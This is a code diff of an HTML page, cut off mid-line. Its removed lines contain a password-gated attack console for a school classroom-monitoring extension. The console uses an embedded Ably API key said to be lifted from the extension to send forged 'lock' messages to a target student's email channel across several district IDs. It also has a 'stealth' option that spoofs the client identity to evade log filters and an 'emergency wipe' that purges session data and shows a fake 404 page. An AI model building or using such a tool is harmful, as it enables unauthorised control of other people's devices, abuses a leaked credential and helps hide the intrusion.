@@ -11,216 +11,25 @@
         * { box-sizing: border-box; transition: all 0.3s ease; }
         body { font-family: 'Poppins', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
         
-        /* Login Screen Styles */
         #auth-screen { text-align: center; width: 100%; max-width: 400px; }
-        
-        /* Dashboard Container */
         .glass-card { background: var(--card); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 32px; padding: 35px; width: 100%; max-width: 550px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); }
         .hidden { display: none !important; }
 
-        /* Menu Tabs */
         .nav-menu { display: flex; background: rgba(0,0,0,0.5); border-radius: 16px; padding: 4px; margin-bottom: 25px; }
         .nav-item { flex: 1; text-align: center; padding: 10px; cursor: pointer; border-radius: 12px; font-size: 0.8rem; font-weight: 600; color: #64748b; }
         .nav-item.active { background: var(--accent); color: white; }
 
-        /* Status & Master Switch */
+        /* Master Switch & Status Dot */
         .master-container { background: rgba(255,255,255,0.03); padding: 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); margin-bottom: 25px; display: flex; justify-content: space-between; align-items: center; }
-        .master-label { font-weight: 600; font-size: 1rem; color: #94a3b8; }
-        .master-container.active { border-color: var(--accent); background: rgba(139, 92, 246, 0.05); }
-        .master-container.active .master-label { color: var(--accent); }
+        .master-label { font-weight: 600; font-size: 1rem; color: #94a3b8; display: flex; align-items: center; gap: 10px; }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #334155; box-shadow: 0 0 0 rgba(0,0,0,0); }
+        .status-dot.online { background: var(--success); box-shadow: 0 0 10px var(--success); }
+        .status-dot.offline { background: var(--error); }
 
-        /* Feature Rows */
         .feature-item { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
         .feature-info { flex: 1; padding-right: 15px; }
         .feature-title { font-size: 0.85rem; font-weight: 600; display: block; }
         .feature-desc { font-size: 0.65rem; color: #64748b; }
 
         h1 { font-size: 2.2rem; text-align: center; margin: 0 0 20px 0; background: linear-gradient(to right, var(--primary), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        input { width: 100%; padding: 14px; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; color: white; margin-bottom: 15px; outline: none; }
-        input:focus { border-color: var(--accent); }
-        button { width: 100%; padding: 16px; border-radius: 14px; border: none; font-weight: 600; cursor: pointer; color: white; background: var(--accent); }
-        
-        .btn-destruct { background: var(--error); margin-top: 30px; opacity: 0.5; font-size: 0.8rem; }
-        .btn-destruct:hover { opacity: 1; }
-
-        /* Toggle Switches */
-        .switch { position: relative; display: inline-block; width: 44px; height: 22px; flex-shrink: 0; }
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #334155; border-radius: 34px; }
-        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: white; border-radius: 50%; }
-        input:checked + .slider { background-color: var(--success); }
-        input:checked + .slider:before { transform: translateX(22px); }
-        #kill-switch:checked + .slider { background-color: var(--accent); }
-
-        /* Self-Destruct Animation */
-        @keyframes fadeOut { from { opacity: 1; transform: scale(1); } to { opacity: 0; transform: scale(0.9); } }
-        .destruct-sequence { animation: fadeOut 0.8s forwards; }
-    </style>
-</head>
-<body>
-
-<div id="auth-screen">
-    <h1>shhhh.. 🤫</h1>
-    <input type="password" id="passkey" placeholder="Access Key">
-    <button onclick="login()">Enter Console</button>
-</div>
-
-<div id="dashboard" class="glass-card hidden">
-    <h1>shhhh.. 🤫</h1>
-
-    <div class="nav-menu">
-        <div class="nav-item active" onclick="tab('main')">Control</div>
-        <div class="nav-item" onclick="tab('stealth')">Stealth</div>
-    </div>
-
-    <div id="panel-main">
-        <div class="master-container" id="master-box">
-            <div class="master-label" id="master-text">Network: Disconnected</div>
-            <label class="switch">
-                <input type="checkbox" id="kill-switch" onchange="toggleSystem()">
-                <span class="slider"></span>
-            </label>
-        </div>
-
-        <div id="control-fields" style="opacity: 0.4; pointer-events: none;">
-            <input type="email" id="email" placeholder="student@school.edu">
-
-            <div class="feature-item">
-                <div class="feature-info">
-                    <span class="feature-title">Lock Handshake</span>
-                    <span class="feature-desc">Replicates the 'lock' event required by classroom.wasm.</span>
-                </div>
-                <label class="switch"><input type="checkbox" id="tog-lock" checked><span class="slider"></span></label>
-            </div>
-
-            <button onclick="executeAction()">🚀 Execute Broadcast</button>
-        </div>
-    </div>
-
-    <div id="panel-stealth" class="hidden">
-        <div class="feature-item">
-            <div class="feature-info">
-                <span class="feature-title">Fingerprint Masking</span>
-                <span class="feature-desc">Spoof console identity to bypass log filters.</span>
-            </div>
-            <label class="switch"><input type="checkbox" id="tog-incog" onchange="initSystem()"><span class="slider"></span></label>
-        </div>
-        
-        <button class="btn-destruct" onclick="selfDestruct()">⚠️ EMERGENCY WIPE</button>
-        <p style="font-size: 0.6rem; color: #64748b; text-align: center; margin-top: 10px;">Disconnects and purges all session evidence.</p>
-    </div>
-
-    <div id="status-bar" style="margin-top: 20px; text-align: center; font-size: 0.75rem; min-height: 1.2em;"></div>
-</div>
-
-<script>
-    /** * Constants derived from extension source analysis.
-     * These allow us to replicate the school's communication logic.
-     */
-    const KEY = '1k1Wbw.G52kOXvb7p7UbwFRV3ahn74m6xklosio2XUdLlTL'; 
-    const DISTRICTS = ['60-7576-A000', '74-1335-F000', '60-8732-A000']; 
-    let ably = null;
-
-    /** * Login Gate logic. Default password is 'shhhh'.
-     */
-    function login() {
-        if(document.getElementById('passkey').value === "shhhh") {
-            document.getElementById('auth-screen').classList.add('hidden');
-            document.getElementById('dashboard').classList.remove('hidden');
-            // Tool starts in the 'OFF' state; we do not run initSystem() yet.
-            log("System standby. Enable Network Link to begin.", "#64748b");
-        } else { alert("Access Denied"); }
-    }
-
-    /** * Tab navigation between Control and Stealth panels.
-     */
-    function tab(name) {
-        document.getElementById('panel-main').classList.toggle('hidden', name !== 'main');
-        document.getElementById('panel-stealth').classList.toggle('hidden', name !== 'stealth');
-        document.querySelectorAll('.nav-item').forEach(i => i.classList.toggle('active', i.innerText.toLowerCase() === name));
-    }
-
-    /** * Connection Initialization: Sets up the fingerprint (clientId) for the handshake.
-     */
-    function initSystem() {
-        const isIncog = document.getElementById('tog-incog').checked;
-        const cid = isIncog ? " " : "adm-" + Math.random().toString(36).substr(2,6);
-        
-        if (ably) ably.close();
-        ably = new Ably.Realtime({ key: KEY, clientId: cid });
-        
-        log(isIncog ? "Stealth Link Initialized" : "Admin Link Initialized", "var(--success)");
-    }
-
-    /** * Master Switch: Controls the live connection status.
-     * The tool only communicates when this is toggled ON.
-     */
-    function toggleSystem() {
-        const isActive = document.getElementById('kill-switch').checked;
-        const box = document.getElementById('master-box');
-        const text = document.getElementById('master-text');
-        const fields = document.getElementById('control-fields');
-
-        if(isActive) {
-            initSystem();
-            box.classList.add('active');
-            text.innerText = "Network: Active";
-            fields.style.opacity = "1";
-            fields.style.pointerEvents = "all";
-        } else {
-            if(ably) ably.close();
-            box.classList.remove('active');
-            text.innerText = "Network: Disconnected";
-            fields.style.opacity = "0.4";
-            fields.style.pointerEvents = "none";
-            log("Link Severed. Tool dormant.", "var(--error)");
-        }
-    }
-
-    /** * Execution Logic: Sends the 'lock' packet targeting specific school districts.
-     */
-    async function executeAction() {
-        const mail = document.getElementById('email').value;
-        if(!mail) return log("Error: Target email required", "var(--error)");
-        
-        if(document.getElementById('tog-lock').checked) {
-            DISTRICTS.forEach(id => {
-                const chan = ably.channels.get(`user:${mail}`);
-                // Replicates the JSON structure the extension's WASM engine validates.
-                chan.publish('lock', { 
-                    action: 'lock', 
-                    data: { 
-                        customerId: id, 
-                        type: 'lock', 
-                        lockExpiration: Date.now() + 300000 
-                    } 
-                });
-            });
-            log(`Signal broadcasted to ${mail}`, "var(--success)");
-        }
-    }
-
-    /** * Emergency Self-Destruct:
-     * 1. Closes the socket to hide from network presence logs.
-     * 2. Wipes browser session history.
-     * 3. Deletes the interface.
-     */
-    function selfDestruct() {
-        if(confirm("Confirm emergency wipe? All session data will be purged.")) {
-            document.getElementById('dashboard').classList.add('destruct-sequence');
-            if(ably) ably.close();
-            localStorage.clear();
-            sessionStorage.clear();
-            setTimeout(() => {
-                document.body.innerHTML = "<div style='color:#1e293b; text-align:center; font-family:sans-serif; margin-top:40vh;'><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></div>";
-            }, 800);
-        }
-    }
-
-    function log(m, c) {
-        const s = document.getElementById('status-bar');
-        s.innerText = m; s.style.color = c;
-    }
-</script>
-</body>
-</html>
+        input { width: 100%; padding: 14px; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.05); border-radius
